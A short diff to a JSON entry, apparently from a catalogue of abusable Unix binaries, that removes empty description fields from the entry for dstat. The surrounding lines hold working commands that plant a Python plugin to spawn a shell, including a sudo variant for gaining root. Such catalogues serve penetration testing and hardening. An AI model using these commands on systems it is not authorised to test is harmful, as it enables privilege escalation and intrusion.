@@ -2,13 +2,13 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "mkdir -p ~/.dstat\necho 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >~/.dstat/dstat_xxx.py\ndstat --xxx\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
       }
     ]
